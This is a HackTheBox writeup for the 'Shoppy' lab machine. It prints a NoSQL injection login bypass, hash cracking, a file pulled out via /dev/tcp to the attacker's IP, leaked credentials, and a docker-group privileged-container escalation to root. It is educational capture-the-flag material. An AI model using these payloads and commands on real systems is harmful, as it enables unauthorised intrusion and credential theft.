---
layout: single
title: Shoppy hackthebox writeup
excerpt: "Easy linux machine in which we inject NoSQL code, crack a password, reverse engineer a binary and escalate through docker"
date: 2022-11-06
classes: wide
header:
  teaser: /assets/images/shoppy/shoppy_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - NoSQL
  - fuzzing
  - reverse engineering
  - docker
---

![](/assets/images/shoppy/shoppy.png)

## User flag

First thing first, port scanning

```shell
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
9093/tcp open  copycat syn-ack ttl 63
```

Having port 9093 is quite odd, if you check it with your browser you will find some information about a mattermost server but nothing too crucial. On the other hand, if we fuzz the main webpage (port 80) we find

```shell
ffuf -w /home/dasor/wordlist/directory-list-2.3-big.txt -u http://shoppy.htb/FUZZ -v -of md -o ffuf_common -t 200
```

| FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type | ResultFile |
  | :- | :-- | :--------------- | :---- | :------- | :---------- | :------------- | :------------ | :--------- | :----------- |
  | images | http://shoppy.htb/images | /images/ | 2 | 301 | 179 | 7 | 11 | text/html; charset=UTF-8 |  |
  | login | http://shoppy.htb/login |  | 39 | 200 | 1074 | 152 | 26 | text/html; charset=UTF-8 |  |
  | admin | http://shoppy.htb/admin | /login | 245 | 302 | 28 | 4 | 1 | text/plain; charset=utf-8 |  |
  | assets | http://shoppy.htb/assets | /assets/ | 277 | 301 | 179 | 7 | 11 | text/html; charset=UTF-8 |  |
  | css | http://shoppy.htb/css | /css/ | 540 | 301 | 173 | 7 | 11 | text/html; charset=UTF-8 |  |
  | Login | http://shoppy.htb/Login |  | 811 | 200 | 1074 | 152 | 26 | text/html; charset=UTF-8 |  |
  | js | http://shoppy.htb/js | /js/ | 939 | 301 | 171 | 7 | 11 | text/html; charset=UTF-8 |  |
  | fonts | http://shoppy.htb/fonts | /fonts/ | 2744 | 301 | 177 | 7 | 11 | text/html; charset=UTF-8 |  |
  | Admin | http://shoppy.htb/Admin | /login | 6193 | 302 | 28 | 4 | 1 | text/plain; charset=utf-8 |  |
  | exports | http://shoppy.htb/exports | /exports/ | 34903 | 301 | 181 | 7 | 11 | text/html; charset=UTF-8 |  |
  |  | http://shoppy.htb/ |  | 39970 | 200 | 2178 | 853 | 57 | text/html; charset=UTF-8 |  |
  | LogIn | http://shoppy.htb/LogIn |  | 94229 | 200 | 1074 | 152 | 26 | text/html; charset=UTF-8 |  |
  | LOGIN | http://shoppy.htb/LOGIN |  | 178341 | 200 | 1074 | 152 | 26 | text/html; charset=UTF-8 |  |


The only one that works is the login page. I started trying LDAP injection and SQL injection but it didn't work out. However, I tried the `admin'||'1==1` NoSQL injection and it worked. Now in the admin panel, there is a "Search for users" button that is also vulnerable to NoSQL injection. So if we inject `'||'1==1` we get all users (only admin and josh) and their hashed md5 password.

So obviously let's crack the passwords

```shell
[dasor@archlinux ~/htb/shoppy]$ hashcat -m 1000 hashjosh ~/wordlist/rockyou.txt --show
6ebcea65320589ca4f2f1ce039975995:remembermethisway
```

Unfortunately, the admin password couldn't be cracked. To be honest, I got stuck at this point so I started from the beginning again, Then I remembered I didn't fuzz for VHOST so that's what I did.

```shell
ffuf -w ~/wordlist/subdomains-UPDATED.txt -u http://shoppy.htb -H 'Host: FUZZ.shoppy.htb' -fs 169 -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb
 :: Wordlist         : FUZZ: /home/dasor/wordlist/subdomains-UPDATED.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 169
________________________________________________

mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1]
```

A mattermost VHOST appears, it makes a lot of sense. As usual, let's add the subdomain to our /etc/hosts.

```shell
10.10.11.180    shoppy.htb mattermost.shoppy.htb
```

In this new VHOST, we find a login page, the credentials we got earlier are valid. This mattermost page is similar to the one faced in the [paper machine](./2021-12-24-Paper-Writeup.md). In this chat, we find credentials for a user called jaeger. Also, there is information about a password manager made in c++. So let's remember that a login via ssh

```shell
[dasor@archlinux ~/htb/shoppy]$ ssh jaeger@shoppy.htb
jaeger@shoppy.htb's password:
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
jaeger@shoppy:/home/deploy$
```

user flag done!

## Root flag

Now if we start doing the usual privesc checks we find the password manager mentioned before

```shell
jaeger@shoppy:/home/deploy$ sudo -l
[sudo] password for jaeger:
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

We can read the source code but we can look at the binary so I copied it to my machine
```shell
jaeger@shoppy:/home/deploy$ cat password-manager > /dev/tcp/10.10.14.32/7777
[dasor@archlinux ~/htb/shoppy]$ nc -lvp 7777 > bin
Connection from 10.10.11.180:56928
```

Next, I opened the binary with ghira to decompile it (maybe a little bit overkill). with this, I found the master password that the binary asks for.

![](/assets/images/shoppy/ghidra.png)

<p align = "center">
screenshot of ghidra where the master password can be seen in the decompile window
</p>

Now let's use the password in the actual victim's machine

```shell
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

With these credentials, we can escalate to user deploy and then proceed with another round of searching for privesc vectors.

```shell
jaeger@shoppy:/home/deploy$ su deploy
Password:
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
deploy@shoppy:~$ groups
deploy docker
```

Now the way to finish is by exploiting docker since we are part of the docker group. This method is straightforward although I haven't posted any CTF with this. Just look for an image and execute it as a privileged user like this

```shell
deploy@shoppy:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   3 months ago   5.53MB
deploy@shoppy:~$ docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host alpine chroot /host
root@shoppy:/# cd
root@shoppy:~# ls
root.txt
```

And we are now root in the system, thanks for reading!
